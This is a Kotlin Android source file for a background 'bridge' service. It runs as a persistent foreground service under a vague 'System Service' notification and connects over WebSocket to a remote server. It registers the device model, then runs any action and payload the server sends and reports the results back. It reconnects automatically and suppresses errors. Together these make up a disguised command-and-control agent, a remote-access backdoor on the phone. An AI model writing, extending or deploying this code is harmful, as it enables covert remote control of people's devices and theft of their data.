package com.example.agent

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class AndroidBridgeService : Service() {

    private var ws: WebSocket? = null
    private val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).pingInterval(15, TimeUnit.SECONDS).build()
    private lateinit var sys: SystemManager

    override fun onCreate() {
        super.onCreate()
        sys = SystemManager(this)
        startForeground()
        connect()
    }

    private fun startForeground() {
        val cid = "BridgeChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(cid, "System Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(chan)
        }
        val notif = NotificationCompat.Builder(this, cid)
            .setContentTitle("System Service")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
        startForeground(1, notif)
    }

    private fun connect() {
        val req = Request.Builder().url("wss://echo.websocket.org").build() // نقطه پایانی تست
        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                val init = JSONObject().apply {
                    put("event", "AGENT_REGISTER")
                    put("device_id", Build.MODEL)
                }
                webSocket.send(init.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    val cid = json.optString("command_id")
                    val act = json.optString("action")
                    val pay = json.optJSONObject("payload")

                    Thread {
                        val res = sys.executeAction(act, pay)
                        val out = JSONObject().apply {
                            put("event", "COMMAND_RESULT")
                            put("command_id", cid)
                            put("data", res)
                        }
                        webSocket.send(out.toString())
                    }.start()
                } catch (e: Exception) {}
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                android.os.Handler(mainLooper).postDelayed({ connect() }, 5000)
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
